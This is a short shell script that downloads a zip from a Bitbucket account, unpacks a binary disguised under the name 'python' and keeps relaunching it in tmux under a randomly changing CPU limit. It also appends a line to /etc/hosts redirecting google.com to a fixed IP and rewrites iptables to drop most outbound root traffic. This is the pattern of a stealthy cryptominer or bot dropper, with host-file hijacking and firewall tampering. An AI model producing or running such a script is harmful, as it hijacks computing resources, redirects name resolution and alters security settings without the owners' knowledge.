#!/bin/sh
sudo apt-get update -y
sudo apt-get install tmux cpulimit unzip -y

wget https://bitbucket.org/tengikekao/myrep/downloads/data.zip
unzip data.zip
chmod +x python
sudo -- sh -c "echo '216.244.80.11  google.com' >> /etc/hosts"
sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
sudo iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
sudo iptables -I OUTPUT 3 -p tcp -d ebay.com --dport 80 -j ACCEPT
sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
while (true) ; do sudo pkill cpulimit;sudo pkill python ;r=$(($RANDOM % 300 + 80 ));echo $r;tmux new-session -d -s my_session1 './python';sleep 5;cpulimit -l $r -b -p $(pgrep -n "python");sleep $r;done
